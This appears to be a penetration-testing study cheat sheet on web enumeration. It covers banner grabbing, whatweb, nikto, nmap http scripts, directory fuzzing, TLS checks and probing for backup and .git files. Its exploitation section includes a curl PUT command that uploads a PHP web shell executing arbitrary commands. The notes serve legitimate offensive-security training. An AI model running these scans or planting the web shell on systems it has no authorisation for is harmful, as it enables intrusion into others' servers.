# Web Application Scanning & Enumeration

**Source:** gabb4r/OSCP Notes Integration

## Quick Intro

- Identify web technologies, frameworks, server info
- Vulnerability discovery and service identification
- Passive and active reconnaissance techniques
- Foundation for exploitation

## Banner Grabbing

```bash
# HTTP banner
nc -nv <IP> 80
GET / HTTP/1.1
Host: <IP>

# Direct curl
curl -i http://<IP>
curl -I http://<IP>

# Headers only
curl -v http://<IP> 2>&1 | grep -E "^(<|>)"
```

## Whatweb - Technology Detection

```bash
whatweb http://<IP>
whatweb --aggressive http://<IP>
whatweb --aggression 3 http://<IP>
```

## Nikto - Web Server Scanner

```bash
nikto -host http://<IP>
nikto -host http://<IP> -p 8080
nikto -host http://<IP> -C all
nikto -host http://<IP>:80 -o report.txt
```

## NMAP Web Scanning

```bash
# HTTP detection
nmap -sV -p 80 <IP>

# Comprehensive web scanning
nmap --script http-* -p 80,443 <IP>

# Specific checks
nmap --script http-title -p 80 <IP>
nmap --script http-robots.txt -p 80 <IP>
nmap --script http-enum -p 80 <IP>
```

## Directory Enumeration (Standalone)

```bash
# dirb
dirb http://<IP> /usr/share/wordlists/dirb/common.txt

# gobuster (faster)
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# ffuf (fastest)
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## SSL/TLS Analysis

```bash
# sslscan
sslscan http://<IP>:443

# testssl.sh
./testssl.sh <IP>

# NMAP SSL check
nmap --script ssl-cert,ssl-enum-ciphers -p 443 <IP>
```

## Find Hidden Files/Backups

```bash
# .bak, .old, .tmp, etc
curl http://<IP>/index.php.bak
curl http://<IP>/backup.sql
curl http://<IP>/.git/

# Common backup locations
/.git/
/.svn/
/.hg/
/backup/
/old/
/tmp/
```

## Web Server Exploitation

```bash
# Test PUT method
curl -X PUT http://<IP>/test.php
curl -X PUT -d "<?php system(\$_GET['cmd']); ?>" http://<IP>/shell.php

# OPTIONS method
curl -X OPTIONS http://<IP> -v

# TRACE method (server reflection)
curl -X TRACE http://<IP>
```

## Related Notes

- [[07-Web-Application/CMS-Enumeration]] → CMS-specific enumeration
- [[07-Web-Application/Directory-Fuzzing]] → Fuzzing techniques
- [[07-Web-Application/LFI-RFI]] → Path traversal exploitation
